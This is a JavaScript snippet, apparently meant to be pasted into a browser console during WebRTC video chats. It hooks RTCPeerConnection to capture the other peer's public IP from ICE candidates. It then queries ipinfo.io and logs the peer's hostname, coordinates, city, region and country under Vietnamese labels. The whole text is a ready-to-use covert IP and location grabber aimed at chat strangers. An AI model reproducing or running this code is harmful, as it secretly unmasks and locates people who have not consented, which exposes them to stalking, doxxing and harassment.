YOUR_TOKEN = 'XXXXXXXXXXXXXX' /* Get your token here https://ipinfo.io */
window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection

window.RTCPeerConnection = function(...args) {
 const pc = new window.oRTCPeerConnection(...args)

pc.oaddIceCandidate = pc.addIceCandidate

pc.addIceCandidate = function(iceCandidate, ...rest) {
 const fields = iceCandidate.candidate.split(' ')

if (fields[7] === 'srflx') {
var today=new Date();
var date = today.getDate()+'-'+(today.getMonth()+1)+'-'+today.getFullYear();
var today = new Date();
var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
fetch('https://ipinfo.io/'+fields[4]+'?token='+YOUR_TOKEN)
        .then(res => res.json())
         .then(data => {
              console.log('Thời gian'+date+' '+time+'\n'+'IP: '+data['ip']+'\n'+' HostName: '+data['hostname']+'\n'+' Tọa độ: '+data['loc']+'\n'+' Thành phố: '+data['city']+'\n'+' Tỉnh: '+data['region']+'\n'+' Quốc gia: '+data['country'])
       })
}
return pc.oaddIceCandidate(iceCandidate, ...rest)

}

return pc
}
